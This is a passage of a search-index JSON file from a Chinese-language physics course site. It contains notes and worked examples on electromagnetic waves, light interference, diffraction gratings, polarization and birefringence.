\u4efb\u4f55\u7ed9\u5b9a\u70b9\u4e0a \\(E\\) \u548c \\(H\\) \u90fd\u5728\u4f5c\u5468\u671f\u6027\u53d8\u5316\uff0c\u4e8c\u8005\u76f8\u4f4d\u76f8\u540c\u3002</li> <li>&lt;4&gt; \u7406\u8bba\u8868\u660e\uff0c\\(E\\) \u548c \\(H\\) \u7684\u91cf\u503c\u6210\u6bd4\u4f8b<ul> <li> \\[\\sqrt{\\varepsilon_0 \\varepsilon}E=\\sqrt{ \\mu_0 \\mu}H\\] </li> </ul> </li> <li>&lt;5&gt; \u7406\u8bba\u8868\u660e\uff0c\u7535\u78c1\u6ce2\u7684\u4f20\u64ad\u901f\u5ea6\u4e3a\uff1a<ul> <li> \\[v=\\frac{1}{\\sqrt{\\varepsilon_0 \\varepsilon \\mu_0\\mu}}\\] </li> <li>\u5728\u771f\u7a7a\u4e2d\uff0c\\(c=\\frac{1}{\\sqrt{\\varepsilon_0 \\mu_0}}=3\\times 10^8 m/s\\)</li> </ul> </li> <li>&lt;6&gt; \\(E\\) \u548c \\(H\\) \u7684\u91cf\u7ea7\u548c\u7535\u78c1\u6ce2\u9891\u7387\u7684\u5e73\u65b9\u6210\u6b63\u6bd4\u3002</li> <li>&lt;7&gt; \u7535\u78c1\u80fd\u91cf\u5bc6\u5ea6 \\(u=\\frac{1}{2}\\varepsilon_0 E^2 +\\frac{1}{2}\\mu_0 H^2\\)</li> <li>&lt;8&gt; \u7535\u78c1\u6ce2\u5f3a\u5ea6=\u8f90\u5c04\u529f\u7387/\u63a5\u6536\u9762\u79ef</li> </ul> <p>\u7535\u78c1\u6ce2\u7684\u53d1\u5c04\u6761\u4ef6</p> <p>LC \u7535\u8def\u7684\u9891\u7387\u5fc5\u987b\u7279\u522b\u9ad8\uff0c\u4e14\u7535\u8def\u5f00\u653e</p> <p>\u5b9a\u4e49\u5355\u4f4d\u65f6\u95f4\u901a\u8fc7\u5782\u76f4\u4e8e\u4f20\u64ad\u65b9\u5411\u7684\u5355\u4f4d\u9762\u79ef\u7684\u80fd\u91cf\u4e3a\u7535\u78c1\u6ce2\u7684\u80fd\u6d41\u5bc6\u5ea6\uff0c\u8bb0\u4e3a\u77e2\u91cf \\(S\\) \uff0c\u65b9\u5411\u4e3a\u7535\u78c1\u6ce2\u4f20\u64ad\u7684\u65b9\u5411\u3002</p> <p>\u5219\uff1a</p> \\[ S=E\\times H \\] <p>\u5bf9\u4e8e\u7b80\u8c10\u6ce2\uff0c\u5b83\u5728\u4e00\u4e2a\u5468\u671f\u5185\u7684\u5e73\u5747\u503c\uff0c\u5373\u5e73\u5747\u80fd\u6d41\u5bc6\u5ea6\u4e3a\uff1a</p> \\[ \\bar{S}=\\frac{1}{2}E_0 H_0 \\] <p>\u5176\u4e2d \\(E_0, H_0\\) \u5206\u522b\u4e3a \\(E,H\\) \u7684\u632f\u5e45\u3002</p> <p>\u6c42\u5761\u5370\u5ef7\u77e2\u91cf</p> <p></p>"},{"location":"Courses/Physics/PhysicsII/optics/","title":"\u5149\u5b66\u90e8\u5206","text":""},{"location":"Courses/Physics/PhysicsII/optics/#_1","title":"\u5149\u5b66\u90e8\u5206","text":"<p> \u7ea6 2611 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p>"},{"location":"Courses/Physics/PhysicsII/optics/#_2","title":"\u5149\u7684\u5e72\u6d89","text":"<p>\u5f53\u5149\u5728\u4ecb\u8d28\u7ecf\u8fc7\u8def\u7a0b \\(x\\) \u65f6\uff0c\u76f8\u4f4d\u53d8\u5316\u4e3a\uff1a</p> \\[ \\Delta \\phi = 2\\pi \\frac{x}{\\lambda_n} = \\frac{2\\pi}{\\lambda} nx = \\frac{2\\pi}{\\lambda} \\delta \\] <p>\u5176\u4e2d \\(\\delta = nx\\) \u79f0\u4e3a\u5149\u7a0b\uff0c\u8fd9\u662f\u5149\u7684\u5e72\u6d89\u57fa\u672c\u6a21\u578b\u4e2d\u6700\u57fa\u672c\u7684\u53c2\u6570\u3002</p> <p>\u534a\u6ce2\u635f\u5931</p> <p>\u5f53\u5149\u4ece\u6298\u5c04\u7387\u8f83\u5c0f\u7684\u4ecb\u8d28\u5165\u5c04\u5230\u6298\u5c04\u7387\u8f83\u5927\u7684\u4ecb\u8d28\u5e76\u53d1\u751f\u53cd\u5c04\u65f6\uff0c\u5149\u7a0b\u4f1a\u51cf\u5c11 \\(\\lambda/2\\) \uff0c\u8fd9\u79cd\u73b0\u8c61\u79f0\u4e3a\u534a\u6ce2\u635f\u5931\u3002</p> <p>\u5f53\u4e24\u4e2a\u5149\u6ce2\u53d1\u751f\u5e72\u6d89\uff0c\u6709\u5982\u4e0b\u5173\u7cfb\uff1a</p> \\[ \\Delta \\phi = (\\phi_2 -\\phi_1) +\\frac{2\\pi}{\\lambda} \\Delta \\delta =\\left \\{\\begin{array}l 2k\\pi ,&amp; \\text{\u52a0\u5f3a\uff0ck\u7ea7\u660e\u7eb9} \\\\ (2k-1)\\pi, &amp; \\text{\u51cf\u5f31\uff0ck\u7ea7\u6697\u7eb9}\\end{array}\\right . \\] <p>\u7531\u4e8e\u4e00\u822c\u8003\u8651\u521d\u76f8\u4f4d\u76f8\u540c\u7684\u76f8\u5e72\u5149\u6e90\uff0c\u56e0\u6b64\u4e0a\u8ff0\u5173\u7cfb\u53ef\u4ee5\u7b80\u5316\u4e3a\u5982\u4e0b\u7ed3\u8bba\uff1a</p> \\[ \\Delta \\delta = \\left \\{\\begin{array}l k\\lambda ,&amp; \\text{\u52a0\u5f3a\uff0ck\u7ea7\u660e\u7eb9} \\\\ (k-\\frac{1}{2})\\lambda , &amp; \\text{\u51cf\u5f31\uff0ck\u7ea7\u6697\u7eb9}\\end{array}\\right . \\] <p></p> <p>\u725b\u987f\u73af\u4e2d\u5fc3\u662f\u6697\u73af</p> \\[\\begin{array}c r_{k,\u660e}=\\sqrt{\\frac{(2k-1)R\\lambda }{2}} \\\\ r_{k,\u6697}=\\sqrt{kR\\lambda}\\end{array}\\] <p>\u5747\u539a\u8584\u819c\u5e72\u6d89(\u7b49\u503e\u5e72\u6d89)</p> \u56fe 1\u56fe 2 <p></p> <p></p> <p>\u5982\u56fe 1 \u6240\u793a\uff0c\u5c06\u6298\u5c04\u7387\u4e3a \\(n_2\\) \u7684\u8584\u819c\u653e\u7f6e\u4e8e\u6298\u5c04\u7387\u4e3a \\(n_1\\) \u7684\u4ecb\u8d28\u4e2d\uff0c\u65e0\u8bba\u4e8c\u8005\u6298\u5c04\u7387\u5927\u5c0f\u5173\u7cfb\u5982\u4f55\uff0c\u4e24\u4e2a\u53cd\u5c04\u8868\u9762\u4e2d\u90fd\u4f1a\u6709\u4e00\u9762\u53d1\u751f\u534a\u6ce2\u635f\u5931\uff0c\u4f7f\u5f97\u4e8c\u8005\u7684\u5149\u7a0b\u5dee\u4e3a\uff1a</p> \\[\\delta = 2e\\sqrt{n_2^2 -n_1^2\\sin ^2 i} +\\frac{\\lambda}{2} = \\begin{cases}k\\lambda, &amp; \\text{\u660e\u7eb9}\\\\ (2k+1) \\frac{\\lambda}{2}, &amp; \\text{\u6697\u7eb9}\\end{cases}\\] <p>\u8bf7\u6ce8\u610f\u4e0e\u5288\u5c16\u5e72\u6d89(\u7b49\u539a\u5e72\u6d89)\u4f5c\u533a\u5206\u3002</p> \u7b49\u503e\u5e72\u6d89\u6ce8\u610f\u4ecb\u8d28\u548c\u8584\u819c\u6298\u5c04\u7387\u7684\u5173\u7cfb: \u5e76\u975e\u90fd\u6709\u534a\u6ce2\u635f\u5931 <p></p> \u725b\u987f\u73af\u4f8b\u9898: e\u4e3a\u4e2d\u95f4\u7a7a\u6c14\u7684\u8ddd\u79bb <p></p>"},{"location":"Courses/Physics/PhysicsII/optics/#_3","title":"\u5149\u7684\u884d\u5c04","text":""},{"location":"Courses/Physics/PhysicsII/optics/#_4","title":"\u5355\u7f1d\u884d\u5c04","text":"<p>\u5e73\u884c\u5149\u5782\u76f4\u5165\u5c04\u5355\u7f1d\uff1a</p> <p></p> <p>\u4e2d\u592e\u660e\u7eb9\u4f4d\u4e8e \\(\\theta = 0\\) \u5904\uff0c\u5176\u5149\u5f3a\u6700\u5f3a\uff0c\u4e14\u5bbd\u5ea6\u4e3a\u5176\u5b83\u660e\u7eb9\u7684\u4e24\u500d\uff1a</p> \\[ l_0 = 2f \\tan \\theta _1 = 2f\\sin \\theta_1 =\\frac{2\\lambda f}{a} \\] <p></p> <p>\u82e5\u4ee5\u767d\u5149\u5165\u5c04\uff0c\u5219\u767d\u5149\u4e2d\u4e0d\u540c\u6ce2\u957f\u7684\u5149\u4ea7\u751f\u7684\u884d\u5c04\u56fe\u6837\u9664\u4e2d\u592e\u660e\u7eb9\u4e2d\u5fc3\u5916\uff0c\u5176\u4ed6\u5404\u7ea7\u6761\u7eb9\u5c06\u5f7c\u6b64\u9519\u5f00\uff0c\u4e8e\u662f\u89c2\u5bdf\u5230\u884d\u5c04\u56fe\u6837\u5176\u4e2d\u592e\u660e\u7eb9\u7684\u4e2d\u5fc3\u90e8\u5206\u662f\u767d\u8272\u7684\uff0c\u8fb9\u7f18\u4f34\u6709\u5f69\u8272\uff1b\u5176\u4ed6\u5404\u7ea7\u660e\u7eb9\u662f\u7531\u7d2b\u5230\u7ea2\u7684\u5f69\u8272\u6761\u7eb9\u3002</p>"},{"location":"Courses/Physics/PhysicsII/optics/#_5","title":"\u5149\u6805\u884d\u5c04","text":"<p>\u5927\u91cf\u7b49\u5bbd\u5ea6\u7b49\u95f4\u8ddd\u7684\u5e73\u884c\u72ed\u7f1d\u6784\u6210\u7684\u5149\u5b66\u5668\u4ef6\u79f0\u4e3a\u5149\u6805\u3002\u900f\u5c04\u5149\u6805\u7684\u7f1d\u5bbd\u5ea6 \\(a\\)\uff0c\u4e0d\u900f\u5149\u90e8\u5206\u5bbd\u4e3a\\(b\\)\uff0c\\(d=a+b\\) \u79f0\u4e3a\u5149\u6805\u5e38\u6570\u3002\u5149\u6805\u72ed\u7f1d\u6570\u8d8a\u591a\uff0c\u884d\u5c04\u6761\u7eb9\u5c31\u8d8a\u7ec6\u9510\u3001\u660e\u4eae\u3002</p> <p>\u5149\u6805\u56fe\u50cf\u662f\u591a\u4e2a\u72ed\u7f1d\u5355\u7f1d\u884d\u5c04\u56fe\u50cf\u4e92\u76f8\u5e72\u6d89\u5f62\u6210\u7684\u3002\u5bf9\u4e8e\u4efb\u610f\u4e00\u4e2a\u72ed\u7f1d\u5165\u5c04\u7684\u5149\uff0c\u5176\u5f62\u6210\u7684\u5355\u7f1d\u884d\u5c04\u7684\u56fe\u50cf\u662f\u76f8\u540c\u7684\uff08\u5305\u62ec\u4f4d\u7f6e\uff0c\u4e2d\u592e\u660e\u7eb9\u90fd\u4f4d\u4e8e\u900f\u955c\u7126\u70b9\u4e0a\uff09\u3002</p> <p>\u6ee1\u8db3\u5149\u6805\u65b9\u7a0b\u7684\u660e\u7eb9\u88ab\u79f0\u4e3a\u4e3b\u6781\u5927\uff0c\u5176\u5728\u4efb\u610f\u76f8\u90bb\u4e24\u7f1d\u53d1\u51fa\u7684\u5149\u675f\u76f8\u4f4d\u5dee\u4e3a \\(2\\pi\\) \u7684\u6574\u6570\u500d\u65f6\u5f62\u6210\uff1a</p> \\[ (a+b)\\sin \\theta = \\pm k\\lambda,\\ k=0,1,2,...,\\lfloor \\frac{d}{\\lambda}\\rfloor \\] <p>\u56e0\u4e3a \\(\\sin \\theta\\) \u7684\u53d6\u503c\u5c0f\u4e8e 1\uff0c\u56e0\u6b64\u6574\u6570 \\(k\\) \u7684\u53d6\u503c\u6709\u4e0a\u754c \\(k\\lt \\frac{d}{\\lambda}\\)</p> <p>\u800c\u5982\u679c \\(N\\) \u4e2a\u7f1d\u7684\u5149\u675f\u7684\u632f\u5e45\u77e2\u91cf\u5728\u67d0\u70b9\u6070\u597d\u9996\u5c3e\u76f8\u63a5\uff0c\u5f62\u6210 \\(k'\\) \u4e2a\u91cd\u5408\u5728\u4e00\u8d77\u7684\u6b63\u591a\u8fb9\u5f62\uff0c\u90a3\u4e48\u5176\u5408\u6210\u632f\u5e45\u4e3a 0\uff0c\u76f8\u6d88\u5f62\u6210\u6697\u6761\u7eb9\uff1a</p> \\[\\begin{array}c (a+b)\\sin \\theta = \\pm \\frac{k'}{N} \\lambda \\\\ k'\\ne Nk, k' = 1,2,...,N-1,N+1,....,2N-1,2N+1,... \\end{array} \\] <p>\\(k'=Nk\\) \u5c5e\u4e8e\u4e3b\u6781\u5927\u7684\u60c5\u51b5\uff0c\u56e0\u6b64 \\(k'\\) \u4e0d\u80fd\u662f \\(N\\) \u7684\u6574\u6570\u500d\u3002</p> <p>Note</p> <p>\u76f8\u90bb\u4e24\u4e3b\u6781\u5927\u4e4b\u95f4\u5b58\u5728 \\(N-1\\) \u6761\u6697\u7eb9\u3002\u800c\u4e24\u6697\u7eb9\u4e4b\u95f4\u5e94\u8be5\u4e3a\u660e\u7eb9\uff0c\u90a3\u4e48\u4e24\u4e3b\u6781\u5927\u4e4b\u95f4\u6709 \\(N-2\\) \u6761\u660e\u7eb9\u3002\u4f46\u662f\u8ba1\u7b97\u8868\u660e\uff0c\u8fd9\u4e9b\u660e\u7eb9\u7684\u5f3a\u5ea6\u63a5\u8fd1\u96f6\uff0c\u79f0\u4e3a\u6b21\u7ea7\u5927\u3002\u5f53\u5149\u6805\u7f1d\u6570 \\(N\\) \u5f88\u5927\u65f6\uff0c\u5728\u4e24\u4e3b\u6781\u5927\u4e4b\u95f4\u5b9e\u9645\u4e0a\u662f\u4e00\u7247\u6697\u533a\u3002</p> <p>\u4f46\u662f\uff0c\u5982\u679c\u5149\u6805\u884d\u5c04\u51fa\u73b0\u4e3b\u6781\u5927\u7684\u4f4d\u7f6e\u6070\u4e3a\u5355\u7f1d\u884d\u5c04\u6697\u7eb9\u7684\u4f4d\u7f6e\uff0c\u5219\u8be5\u4e3b\u6781\u5927\u5c31\u4e0d\u4f1a\u51fa\u73b0\uff0c\u8fd9\u79cd\u73b0\u8c61\u79f0\u4e3a\u7f3a\u7ea7\uff08\u591a\u4e2a\u6697\u7eb9\u53e0\u52a0\u4ecd\u662f\u6697\u7eb9\uff09\u3002</p> \\[ \\begin{cases}(a+b)\\sin \\theta = \\pm k\\lambda \\\\  a\\sin \\theta = \\pm k'\\lambda  \\end{cases} \\Rightarrow k=\\frac{a+b}{a}k' \\] <p>\u91cd\u8981\u4f8b\u9898\uff1a</p> <p>\u7528\u6bcf\u6beb\u7c73500\u6761\u6805\u7eb9\u7684\u5149\u6805\u89c2\u5bdf\u94a0\u8c31\u7ebf \\(\\lambda=590nm\\), \u5149\u6805\u7f1d\u5bbd \\(a\\) \u548c\u523b\u75d5\u5bbd\u5ea6 \\(b\\) \u4e4b\u6bd4\u4e3a 1:2.</p> <p>\u2460\u5e73\u884c\u5149\u5782\u76f4\u5165\u5c04\u5149\u6805\u65f6\u6700\u9ad8\u80fd\u770b\u5230\u7b2c\u51e0\u7ea7\u5149\u8c31\u7ebf?\u89c2\u5bdf\u5c4f\u4e0a\u5171\u6709\u51e0\u6761\u5149\u8c31\u7ebf?</p> <p>\u2461\u5e73\u884c\u5149\u4ee530\u5ea6\u659c\u5165\u5c04\u65f6,\u6700\u9ad8\u80fd\u770b\u5230\u7b2c\u51e0\u7ea7\u5149\u8c31\u7ebf?</p> <p>\u89e3\u7b54</p> \\[\\begin{array}c d=a+b= \\frac{1\\times 10^{-3}}{500} =2\\times 10^{-6} (m) \\\\ k_{max}=\\frac{d}{\\lambda} =3.39 \\Rightarrow \\text{\u6700\u9ad8\u80fd\u770b\u89c1\u4e09\u7ea7\u8c31\u7ebf} \\\\ \\text{\u8003\u8651\u7f3a\u7ea7\u65b9\u7a0b\uff1a}\\ k=\\frac{a+b}{a}k' = 3k' \\\\ \\text{\u56e0\u6b64\u5149\u8c31\u7b2c3\u7b49\u8c31\u7ebf\u7f3a\u7ea7\uff0c\u5c4f\u4e0a\u5b9e\u9645\u8c31\u7ebf\u4e3a0,}\\pm\\text{1},\\pm \\text{2\u5171\u4e94\u6761} \\end{array}\\] <p>\u4ee5\u4e09\u5341\u5ea6\u89d2\u659c\u5165\u5c04\uff0c\u5219\u8981\u5728\u7b2c\u4e00\u95ee\u57fa\u7840\u4e0a\u989d\u5916\u8003\u8651 \\(\\sin \\frac{\\pi}{6}\\) \u5e26\u6765\u7684\u5f71\u54cd\uff1a</p> \\[\\begin{array}c k_{max}=\\frac{d}{\\lambda}(\\sin \\frac{\\pi}{6}+1)=5.08 \\\\ \\text{\u6700\u9ad8\u80fd\u770b\u89c1\u4e94\u7ea7\u8c31\u7ebf} \\end{array}\\] <p>\u5728\u6ce2\u957f \\(\\lambda\\) \u9644\u8fd1\uff0c\u6709\u4e24\u79cd\u5355\u8272\u5149\u540c\u65f6\u5782\u76f4\u7167\u5c04\u5149\u6805\uff0c\u5b83\u4eec\u7684\u884d\u5c04\u6761\u7eb9\u53d1\u751f\u91cd\u53e0\u3002\u82e5\u4e24\u79cd\u5149\u6ce2\u957f\u5dee\u4e3a \\(d\\lambda\\) \u65f6\uff0c\u5149\u6805\u521a\u597d\u80fd\u5206\u8fa8\u51fa\u662f\u4e24\u6761\u8c31\u7ebf\uff0c\u5219\u5b9a\u4e49\u5176\u7b2c \\(k\\) \u7ea7\u8c31\u7ebf\u7684\u5206\u8fa8\u672c\u9886 \\(R\\) \u4e3a\uff1a</p> \\[ R=\\frac{\\lambda}{d\\lambda}=kN \\] <p>\u5176\u4e2d \\(N\\) \u4e3a\u72ed\u7f1d\u7684\u603b\u6761\u6570\u3002</p> \u9898\u9762\u89e3\u7b54 <p>\u4e00\u5757\u6bcf\u6beb\u7c73 500 \u6761\u7f1d\u7684\u5149\u6805\uff0c\u7528\u94a0\u9ec4\u5149\u7167\u5c04\uff0c\u89c2\u5bdf\u884d\u5c04\u5149\u8c31\u3002\u5df2\u77e5\u94a0\u9ec4\u5149\u5305\u542b\u6ce2\u957f\u5206\u522b\u4e3a \\(589.6nm\\) \u548c \\(589.0nm\\) \u7684\u4e24\u6761\u8c31\u7ebf\uff0c\u6c42\uff1a</p> <p>\uff081\uff09 \u5728\u7b2c\u4e8c\u7ea7\u5149\u8c31\u4e2d\u4e24\u6761\u8c31\u7ebf\u76f8\u4e92\u5206\u79bb\u7684\u89d2\u5ea6</p> <p>\uff082\uff09 \u82e5\u6070\u80fd\u5206\u8fa8\u7b2c\u4e8c\u7ea7\u5149\u8c31\u4e2d\u7684\u8be5\u4e24\u6761\u8c31\u7ebf\uff0c\u6c42\u8fd9\u5757\u5149\u6805\u7684\u6805\u7eb9\u6761\u6570</p> \\[\\begin{array}c (1)\\  d= \\frac{10^{-3}} { 500} = 2\\times 10^{-6}, \\ \\ d\\sin\\theta = k\\lambda, \\ \\ k=2 \\\\ \\Rightarrow \\Delta \\theta = \\arcsin \\frac{2\\lambda_1}{d} - \\arcsin \\frac{2\\lambda_2}{d}  \\\\ (2) \\ R=\\frac{\\lambda} {\\Delta \\lambda} = kN, \\ N= \\frac{\\lambda}{k\\Delta \\lambda}= 491 \u6761\\end{array}\\]"},{"location":"Courses/Physics/PhysicsII/optics/#_6","title":"\u5706\u5b54\u884d\u5c04","text":"<p>\u7b2c\u4e00\u6697\u73af\u7684\u89d2\u4f4d\u7f6e \\(\\theta_1\\) \u4e0e\u5706\u5b54\u76f4\u5f84 \\(D\\)\u3001\u5165\u5c04\u5355\u8272\u5149\u6ce2\u957f \\(\\lambda\\) \u6709\u5982\u4e0b\u5173\u7cfb\uff1a</p> \\[ \\sin \\theta_1= \\frac{1.22\\lambda}{D} = \\theta_1 \\] <p></p> <p>\u5982\u679c\u900f\u955c \\(L_2\\) \u7684\u7126\u8ddd\u4e3a \\(f\\) \uff0c\u5219\u201c\u7231\u91cc\u6591\u201d\u7684\u534a\u5f84\u4e3a\uff1a</p> \\[ R=f\\cdot \\theta_1 =1.22 \\frac{\\lambda f}{D} \\] <p>\u5f53 \\(\\theta &lt;\\theta_1\\) \u65f6\uff0c\u4eea\u5668\u6216\u4eba\u5c31\u65e0\u6cd5\u5206\u8fa8\u4e24\u4e2a\u70b9\u3002\u901a\u5e38\u5c06\u5149\u5b66\u4eea\u5668\u6700\u5c0f\u5206\u8fa8\u89d2\u7684\u5012\u6570\u79f0\u4e3a\u8be5\u4eea\u5668\u7684\u5206\u8fa8\u672c\u9886\uff1a</p> \\[ R=\\frac{D}{1.22\\lambda} \\] <p>\u5f53 \\(D\\) \u8d8a\u5c0f\uff0c\"\u7231\u91cc\u6591\"\u5c31\u8d8a\u5927\uff0c\u884d\u5c04\u6548\u679c\u8d8a\u660e\u663e\uff1b\u4f46\u662f\u5206\u8fa8\u672c\u9886\u4f1a\u53d8\u5f31\u3002</p> \u6700\u5c0f\u5206\u8fa8\u89d2\u4f8b\u9898 <p></p>"},{"location":"Courses/Physics/PhysicsII/optics/#x","title":"X\u5c04\u7ebf\u884d\u5c04","text":"<p>I'm tired.</p>"},{"location":"Courses/Physics/PhysicsII/optics/#_7","title":"\u5149\u7684\u504f\u632f","text":"<ul> <li>\u7ebf\u504f\u632f\u5149: \u7a7a\u95f4\u5404\u70b9\u7684\u5149\u77e2\u91cf\u5747\u6cbf\u4e00\u4e2a\u65b9\u5411\u632f\u52a8<ul> <li>\\(I=I_0 \\cos ^2 \\theta\\)</li> </ul> </li> <li>\u81ea\u7136\u5149: \u4e24\u4e2a\u632f\u52a8\u65b9\u5411\u5782\u76f4\u3001\u76f8\u4f4d\u5dee\u968f\u673a\u3001\u7b49\u632f\u5e45\u7684\u7ebf\u504f\u632f\u5149\u7ec4\u5408<ul> <li>\\(I= \\frac{I_0}{2}\\)</li> </ul> </li> <li>\u90e8\u5206\u504f\u632f\u5149: \u4ecb\u4e8e\u81ea\u7136\u5149\u548c\u7ebf\u504f\u632f\u5149\u4e4b\u95f4\uff0c\u632f\u52a8\u5728\u5404\u4e2a\u65b9\u5411\u4e0a\u7684\u632f\u5e45\u4e0d\u540c<ul> <li>\\(I= I_{\u81ea}+ I_{\u7ebf}\\)</li> </ul> </li> </ul>"},{"location":"Courses/Physics/PhysicsII/optics/#_8","title":"\u5e03\u5112\u65af\u7279\u5b9a\u5f8b","text":"<p>\u5149\u5728\u67d0\u4e00\u8868\u9762\u53d1\u751f\u53cd\u5c04\u548c\u6298\u5c04\u3002\u5f53\u5165\u5c04\u89d2\u7b49\u4e8e\u5e03\u5112\u65af\u7279\u89d2 \\(i_0\\) \u65f6\uff0c\u53cd\u5c04\u5149\u6210\u4e3a\u632f\u52a8\u65b9\u5411\u5782\u76f4\u4e8e\u5165\u5c04\u9762\u7684\u7ebf\u504f\u632f\u5149\uff0c\u6298\u5c04\u5149\u6210\u4e3a\u6700\u5927\u504f\u632f\u5316\u7a0b\u5ea6\u7684\u90e8\u5206\u504f\u632f\u5149\u3002</p> \\[\\begin{array}c\\tan i_0 = \\frac{n_2}{ n_1} \\\\ i_0 +r =90^\u3002\\end{array}\\] <p>\u5386\u5e74\u5377\u91cc\u6709\u8ba9\u6c42\u8d77\u504f\u89d2\uff0c\u4e5f\u662f\u6c42\u7684\u5e03\u5112\u65af\u7279\u89d2</p> <p></p> <p>Example</p> <p></p>"},{"location":"Courses/Physics/PhysicsII/optics/#_9","title":"\u53cc\u6298\u5c04","text":"<p>\u5149\u7ebf\u5165\u5c04\u5230\u5404\u5411\u5f02\u6027\u6676\u4f53\u65f6\u4f1a\u5206\u88c2\u6210\u504f\u632f\u65b9\u5411\u8fd1\u4f3c\u76f8\u4e92\u5782\u76f4\u7684\u4e24\u675f\u5149\uff0c\u5206\u522b\u4e3a\u670d\u4ece\u6298\u5c04\u5b9a\u5f8b\u7684\u5bfb\u5e38\u5149(o\u5149) \u548c\u4e0d\u670d\u4ece\u7684\u975e\u5bfb\u5e38\u5149(e\u5149)</p> <p>\u6240\u8c13o\u5149\u548ce\u5149\uff0c\u53ea\u5728\u53cc\u6298\u5c04\u6676\u4f53\u5185\u624d\u6709\u610f\u4e49</p> <p>\u53cc\u6298\u5c04\u6676\u4f53\u5185\u5b58\u5728\u4e00\u4e2a\u7279\u6b8a\u7684\u65b9\u5411\uff0c\u5f53\u5149\u7ebf\u5728\u6676\u4f53\u5185\u6cbf\u7740\u8fd9\u4e00\u65b9\u5411\u4f20\u64ad\u65f6\uff0c\u4e0d\u53d1\u751f\u53cc\u6298\u5c04\u73b0\u8c61\uff0c\u8fd9\u4e00\u7279\u6b8a\u7684\u65b9\u5411\u79f0\u4e3a\u6676\u4f53\u7684\u5149\u8f74\u3002\u5149\u8f74\u4ec5\u4ee3\u8868\u65b9\u5411\uff0c\u4efb\u4f55\u4e00\u6761\u4e0e\u4e0a\u8ff0\u5149\u8f74\u5e73\u884c\u7684\u76f4\u7ebf\u90fd\u53ef\u4ee5\u8868\u793a\u5149\u8f74\u3002</p> <p>\u5728\u6676\u4f53\u4e2d\uff0c\u4efb\u610f\u5149\u7ebf\u548c\u5149\u8f74\u7ec4\u6210\u7684\u5e73\u9762\u79f0\u4e3a\u8be5\u5149\u7ebf\u7684\u4e3b\u5e73\u9762\u3002\u5b9e\u9a8c\u8868\u660e\uff0co\u5149\u7684\u632f\u52a8\u65b9\u5411\u5782\u76f4\u4e8eo\u5149\u7684\u4e3b\u5e73\u9762\uff1be\u5149\u7684\u632f\u52a8\u65b9\u5411\u5e73\u884c\u4e8ee\u5149\u7684\u4e3b\u5e73\u9762\u3002</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\uff0co\u5149\u548ce\u5149\u7684\u4e3b\u5e73\u9762\u5e76\u4e0d\u91cd\u5408\uff0c\u4f46\u5bf9\u5927\u591a\u6570\u6676\u4f53\u800c\u8a00\u4e8c\u8005\u5939\u89d2\u76f8\u5dee\u4e0d\u5927\u3002\u5f53\u5149\u8f74\u4e0e\u5165\u5c04\u9762\u5e73\u884c\u65f6(\u5373\u5165\u5c04\u9762\u548c\u4e3b\u622a\u9762\u91cd\u5408)\uff0co\u5149\u548ce\u5149\u7684\u4e3b\u5e73\u9762\u90fd\u4e0e\u4e3b\u622a\u9762\u91cd\u5408\uff0c\u5219\u4e8c\u8005\u632f\u52a8\u65b9\u5411\u5782\u76f4\u3002</p> <p>\u5149\u5728\u5404\u5411\u5f02\u6027\u6676\u4f53\u4e2d\u4f20\u64ad\u901f\u5ea6\u4e0e\u5149\u77e2\u91cf\u632f\u52a8\u65b9\u5411\u548c\u5149\u8f74\u7684\u4f4d\u7f6e\u6709\u5173\uff1a</p> <ul> <li>\u82e5\u632f\u52a8\u65b9\u5411\u4e0e\u5149\u8f74\u5782\u76f4\uff0c\u4f20\u64ad\u901f\u5ea6\u4e3a\u6b63\u5e38\u503c\uff0c\u5bf9\u5e94\u6298\u5c04\u7387\u4e3a \\(n_o\\)</li> <li>\u82e5\u632f\u52a8\u65b9\u5411\u4e0e\u5149\u8f74\u5e73\u884c\uff0c\u4f20\u64ad\u901f\u5ea6\u8fbe\u5230\u6700\u503c\uff0c\u5bf9\u5e94\u6298\u5c04\u7387\u4e3a \\(n_e\\) (\u4e3b\u6298\u5c04\u7387)</li> <li>\u82e5\u4ecb\u4e8e\u4e24\u8005\u4e4b\u95f4\uff0c\u5219\u6298\u5c04\u7387\u4e5f\u4ecb\u4e8e \\(n_o, n_e\\) \u4e4b\u95f4</li> </ul> <p>\u6b63\u6676\u4f53 \\(n_o \\lt n_e\\)\uff0c\u8d1f\u6676\u4f53 \\(n_o \\gt n_e\\)\uff0c\u6211\u4eec\u4e3b\u8981\u8003\u8651\u8d1f\u6676\u4f53</p> <p>\u539a\u5ea6\u5747\u5300\u3001\u4e24\u4e2a\u6676\u9762\u4e0e\u5149\u8f74\u4e92\u76f8\u5e73\u884c\u7684\u6676\u7247\u53ef\u7528\u6765\u5236\u4f5c\u6ce2\u7247\u3002</p> <p></p> <p>\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u4e00\u675f\u6ce2\u957f\u4e3a \\(\\lambda\\) \u7684\u7ebf\u504f\u632f\u5149\u5782\u76f4\u5165\u5c04\u539a\u5ea6\u4e3a \\(d\\) \u7684\u6676\u7247\u3002\u5165\u5c04\u5149\u7684\u632f\u5e45\u4e3a \\(A\\)\uff0c\u5149\u632f\u52a8\u65b9\u5411\u548c\u6676\u7247\u5149\u8f74\u5939\u89d2\u4e3a \\(\\theta\\) \u3002\u6b64\u7ebf\u504f\u632f\u5149\u8fdb\u5165\u6676\u7247\u540e\u751f\u6210o\u5149\u548ce\u5149\uff0co\u5149\u632f\u52a8\u5782\u76f4\u4e8e\u5149\u8f74\uff0ce\u5149\u632f\u52a8\u5e73\u884c\u4e8e\u5149\u8f74\uff0c\u5b83\u4eec\u7684\u632f\u5e45\u5206\u522b\u4e3a\uff1a</p> \\[ \\begin{cases} A_0 = A\\sin \\theta  \\\\ A_e = A\\cos \\theta  \\end{cases} \\] <p>\u7531\u4e8e\u662f\u5782\u76f4\u5165\u5c04\uff0co\u5149\u548ce\u5149\u6cbf\u540c\u4e00\u65b9\u5411\u524d\u8fdb\uff0c\u4f46\u4f20\u64ad\u901f\u5ea6\u4e0d\u540c\uff0c\u4e8c\u8005\u7684\u5149\u7a0b\u5dee\u4e3a \\(\\delta =(n_o -n_e)d\\) \uff0c\u5bf9\u5e94\u7684\u76f8\u4f4d\u5dee\u4e3a\uff1a</p> \\[ \\Delta \\phi = \\frac{2\\pi}{\\lambda} (n_o-n _e)d \\] 